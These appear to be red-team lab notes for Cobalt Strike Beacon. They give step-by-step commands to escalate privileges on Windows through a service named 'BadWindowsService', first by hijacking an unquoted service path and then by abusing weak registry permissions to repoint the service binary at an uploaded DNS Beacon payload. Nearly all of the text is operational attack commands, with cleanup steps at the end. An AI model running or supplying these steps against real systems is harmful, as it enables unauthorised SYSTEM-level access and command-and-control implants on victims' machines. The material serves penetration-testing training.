### Unquoted Service Path
- Verify the binary path of the service.
    1. `sc_qc BadWindowsService`

-  Verify the permissions of the target directory.    
    1. `cacls "C:\Program Files\Bad Windows Service"`

-  Change Beacon's current working directory.    
    1. `cd C:\Program Files\Bad Windows Service`

-  Upload a DNS Beacon service payload.
    1. `upload C:\Payloads\dns_x64.svc.exe`

-  Rename the payload to activate the hijack.
    1. `mv dns_x64.svc.exe Service.exe`

-  Restart the service.
    
    1. `sc_stop BadWindowsService`
    2. `sc_start BadWindowsService`
    
    The new Beacon should appear immediately.
    
-  Interact with the new Beacon.
    1. `Run a checkin command.`

-  Delete the service payload.
    1.` rm Service.exe`

### Service Registry Permissions
- Verify the permissions of the service's regsitry key.
    
    1. powerpick Get-Acl -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService' | fl
-  Stop the service.
    
    1. sc_stop BadWindowsService
-  Change Beacon's current working directory.
    
    1. cd C:\Temp
-  Upload a DNS Beacon service payload.
    
    1. upload C:\Payloads\dns_x64.svc.exe
-  Get the current binary path.
    
    1. sc_qc BadWindowsService
-  Reconfigure the service to point to the payload.
    
    1. sc_config BadWindowsService C:\Temp\dns_x64.svc.exe 0 2
-  Start the service.
    
    1. sc_start BadWindowsService
    
    The elevated Beacon should appear immediately.
    
-  Restore the binary path.
    
    1. sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
-  Delete the service payload.
    
    1. rm dns_x64.svc.exe